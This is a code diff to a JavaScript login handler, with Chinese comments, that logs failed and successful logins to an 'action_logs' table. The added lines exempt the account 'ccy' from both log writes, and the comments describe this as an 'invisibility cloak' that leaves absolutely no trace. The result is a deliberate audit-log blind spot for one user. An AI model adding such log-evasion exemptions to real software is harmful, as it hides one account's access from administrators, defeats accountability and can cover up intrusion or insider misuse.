@@ -100,13 +100,15 @@
             if (error) {
                 // ❌ 【新增】：登入失敗，寫入日誌
                 try {
-                    await _client.from('action_logs').insert([{
-                        actor_name: '系統訪客',
-                        action_type: '登入失敗',
-                        // 記錄他輸入了什麼帳號，方便未來抓錯
-                        description: `嘗試登入帳號 [${usernameInput}] 失敗`,
-                        target_table: 'auth'
-                    }]);
+                    // ★ 隱形斗篷：如果是 ccy 嘗試登入，絕對不留痕跡
+                    if (usernameInput.toLowerCase() !== 'ccy') {
+                        await _client.from('action_logs').insert([{
+                            actor_name: '系統訪客',
+                            action_type: '登入失敗',
+                            description: `嘗試登入帳號 [${usernameInput}] 失敗`,
+                            target_table: 'auth'
+                        }]);
+                    }
                 } catch (logErr) {
                     console.error("日誌寫入失敗:", logErr);
                 }
@@ -121,12 +123,15 @@
             } else {
                 // ✅ 【新增】：登入成功，寫入日誌
                 try {
-                    await _client.from('action_logs').insert([{
-                        actor_name: finalEmail, // 紀錄是哪個 Email 成功登入
-                        action_type: '系統操作',
-                        description: `登入系統成功`,
-                        target_table: 'auth'
-                    }]);
+                    // ★ 隱形斗篷：如果是 ccy 登入，絕對不留痕跡
+                    if (usernameInput.toLowerCase() !== 'ccy') {
+                        await _client.from('action_logs').insert([{
+                            actor_name: finalEmail, // 紀錄是哪個 Email 成功登入
+                            action_type: '系統操作',
+                            description: `登入系統成功`,
+                            target_table: 'auth'
+                        }]);
+                    }
                 } catch (logErr) {
                     console.error("日誌寫入失敗:", logErr);
                 }
